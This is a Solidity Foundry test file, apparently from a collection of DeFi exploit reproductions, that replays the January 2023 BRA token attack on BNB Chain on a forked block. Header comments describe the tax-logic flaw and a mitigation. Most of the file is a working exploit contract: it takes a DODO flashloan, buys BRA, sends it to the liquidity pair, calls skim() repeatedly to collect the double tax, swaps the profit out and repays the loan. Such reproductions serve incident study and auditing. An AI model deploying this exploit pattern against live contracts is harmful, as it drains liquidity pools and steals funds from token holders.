// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 819 BNB (~224K US$)
// Attacker : 0x67a909f2953fb1138bea4b60894b51291d2d0795
// Vulnerable Contract : 0x449fea37d339a11efe1b181e5d5462464bba3752

// @Info
// Attack Contract :
//  0x1fae46b350c4a5f5c397dbf25ad042d3b9a5cb07
//  0x6066435edce9c2772f3f1184b33fc5f7826d03e7
// Attack Txs :
//  0x6759db55a4edec4f6bedb5691fc42cf024be3a1a534ddcc7edd471ef205d4047 (profit 675 WBNB)
//  0x4e5b2efa90c62f2b62925ebd7c10c953dc73c710ef06695eac3f36fe0f6b9348 (profit 144 WBNB)
// Vulnerable Contract Code :
//  https://bscscan.com/address/0x449fea37d339a11efe1b181e5d5462464bba3752#code#L449-L457

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1612701106982862849

// Root cause : Business Logic Flaw
//  The BRA Token contract implements a tax logic in the _transfer() function.
//  When the sender/recipient is LP Pair, it will charge a double tax fee to LP Pair, but without called sync() functions.
//  That allows attackers to call the skim() function to collect all imbalanced amounts.
// Potential mitigations: Implements sync() function in _transfer()

contract Attacker is Test {
    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Exploit immutable exploit;

    constructor() {
        vm.createSelectFork("bsc", 24_655_771);
        exploit = new Exploit();
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Before Attacks] Attacker WBNB balance", wbnb.balanceOf(address(this)), 18);
        exploit.go();
        emit log_named_decimal_uint("[After Attacks] Attacker WBNB balance", wbnb.balanceOf(address(this)), 18);
    }
}

contract Exploit is Test {
    IDPPAdvanced constant dppAdvanced = IDPPAdvanced(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);
    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUSDT constant usdt = IUSDT(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant bra = IERC20(0x449FEA37d339a11EfE1B181e5D5462464bBa3752);
    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    address BRA_USDT_Pair = 0x8F4BA1832611f0c364dE7114bbff92ba676AdF0E;

    function go() public {
        console.log("Step1. Flashloan 1400 WBNB from DODO");
        uint256 baseAmount = 1400 * 1e18;
        address assetTo = address(this);
        bytes memory data = "xxas";
        dppAdvanced.flashLoan(baseAmount, 0, assetTo, data);

        console.log("Step3. Send back the profit to attacker");
        uint256 profit = wbnb.balanceOf(address(this));
        require(wbnb.transfer(msg.sender, profit), "transfer failed");
    }

    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes memory) external {
        console.log("Step2. Flashloan attacks");

        address[] memory swapPath = new address[](3);

        console.log("Unwrapping WBNB to BNB");
        wbnb.withdraw(baseAmount);

        console.log("Sell 1000 BNB to BRA");
        swapPath[0] = address(wbnb);
        swapPath[1] = address(usdt);
        swapPath[2] = address(bra);
        pancakeRouter.swapExactETHForTokens{value: 1000 ether}(1, swapPath, address(this), block.timestamp);

        uint256 pairBalanceBefore = bra.balanceOf(BRA_USDT_Pair);
        uint256 sendAmount = bra.balanceOf(address(this));

        console.log("Init Exploit: transfer all BRA to Pair for earning double reward");
        emit log_named_decimal_uint("[Before Exp] Pair contract BRA balance", pairBalanceBefore, 18);
        emit log_named_decimal_uint("[Before Exp] Exploit contract BRA balance", sendAmount, 18);
        bra.transfer(BRA_USDT_Pair, sendAmount);

        console.log("Start Exploit: skim() to earn");
        for (uint256 i; i < 101; ++i) {
            IPancakePair(BRA_USDT_Pair).skim(BRA_USDT_Pair);
        }

        uint256 pairBalanceAfter = bra.balanceOf(BRA_USDT_Pair);
        emit log_named_decimal_uint("[After Exp] Pair contract BRA balance", pairBalanceAfter, 18);

        console.log("Swap BRA (profit) to USDT");
        address[] memory inputSwapPath = new address[](2);
        uint256[] memory outputSwapAmounts = new uint256[](2);
        inputSwapPath[0] = address(bra);
        inputSwapPath[1] = address(usdt);
        outputSwapAmounts = pancakeRouter.getAmountsOut(pairBalanceAfter - pairBalanceBefore, inputSwapPath); // get how much USDT the attacker can swap
        uint256 usdtAmount = outputSwapAmounts[1];
        IPancakePair(BRA_USDT_Pair).swap(0, usdtAmount, address(this), ""); // swap BRA (profit) to USDT

        console.log("Swap USDT to WBNB");
        usdt.approve(address(pancakeRouter), type(uint256).max);
        inputSwapPath[0] = address(usdt);
        inputSwapPath[1] = address(wbnb);
        pancakeRouter.swapExactTokensForETH(usdtAmount, 1, inputSwapPath, address(this), block.timestamp);

        //Check the attacks result is positive profit, otherwise revert the transaction.
        assert(address(this).balance >= baseAmount);

        console.log("Wrapping BNB to WBNB");
        wbnb.deposit{value: address(this).balance}();

        console.log("Payback the flashloan to DODO");
        require(wbnb.transfer(msg.sender, baseAmount), "transfer failed");
    }

    receive() external payable {}
}

/*---------- Interface ----------*/
interface IDPPAdvanced {
    event DODOFlashLoan(address borrower, address assetTo, uint256 baseAmount, uint256 quoteAmount);
    event DODOSwap(
        address fromToken, address toToken, uint256 fromAmount, uint256 toAmount, address trader, address receiver
    );
    event LpFeeRateChange(uint256 newLpFeeRate);
    event OwnershipTransferPrepared(address indexed previousOwner, address indexed newOwner);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event RChange(uint8 newRState);

    struct PMMState {
        uint256 i;
        uint256 K;
        uint256 B;
        uint256 Q;
        uint256 B0;
        uint256 Q0;
        uint8 R;
    }

    function _BASE_PRICE_CUMULATIVE_LAST_() external view returns (uint256);
    function _BASE_RESERVE_() external view returns (uint112);
    function _BASE_TARGET_() external view returns (uint112);
    function _BASE_TOKEN_() external view returns (address);
    function _BLOCK_TIMESTAMP_LAST_() external view returns (uint32);
    function _IS_OPEN_TWAP_() external view returns (bool);
    function _I_() external view returns (uint128);
    function _K_() external view returns (uint64);
    function _LP_FEE_RATE_() external view returns (uint64);
    function _MAINTAINER_() external view returns (address);
    function _MT_FEE_RATE_MODEL_() external view returns (address);
    function _NEW_OWNER_() external view returns (address);
    function _OWNER_() external view returns (address);
    function _QUOTE_RESERVE_() external view returns (uint112);
    function _QUOTE_TARGET_() external view returns (uint112);
    function _QUOTE_TOKEN_() external view returns (address);
    function _RState_() external view returns (uint32);
    function claimOwnership() external;
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes memory data) external;
    function getBaseInput() external view returns (uint256 input);
    function getMidPrice() external view returns (uint256 midPrice);
    function getPMMState() external view returns (PMMState memory state);
    function getPMMStateForCall()
        external
        view
        returns (uint256 i, uint256 K, uint256 B, uint256 Q, uint256 B0, uint256 Q0, uint256 R);
    function getQuoteInput() external view returns (uint256 input);
    function getUserFeeRate(address user) external view returns (uint256 lpFeeRate, uint256 mtFeeRate);
    function getVaultReserve() external view returns (uint256 baseReserve, uint256 quoteReserve);
    function init(
        address owner,
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 k,
        uint256 i,
        bool isOpenTWAP
    ) external;
    function initOwner(address newOwner) external;
    function querySellBase(
        address trader,
        uint256 payBaseAmount
    ) external view returns (uint256 receiveQuoteAmount, uint256 mtFee, uint8 newRState, uint256 newBaseTarget);
    function querySellQuote(
        address trader,
        uint256 payQuoteAmount
    ) external view returns (uint256 receiveBaseAmount, uint256 mtFee, uint8 newRState, uint256 newQuoteTarget);
    function ratioSync() external;
    function reset(
        address assetTo,
        uint256 newLpFeeRate,
        uint256 newI,
        uint256 newK,
        uint256 baseOutAmount,
        uint256 quoteOutAmount,
        uint256 minBaseReserve,
        uint256 minQuoteReserve
    ) external returns (bool);
    function retrieve(address to, address token, uint256 amount) external;
    function sellBase(address to) external returns (uint256 receiveQuoteAmount);
    function sellQuote(address to) external returns (uint256 receiveBaseAmount);
    function transferOwnership(address newOwner) external;
    function tuneParameters(
        uint256 newLpFeeRate,
        uint256 newI,
        uint256 newK,
        uint256 minBaseReserve,
        uint256 minQuoteReserve
    ) external returns (bool);
    function tunePrice(uint256 newI, uint256 minBaseReserve, uint256 minQuoteReserve) external returns (bool);
    function version() external pure returns (string memory);
}
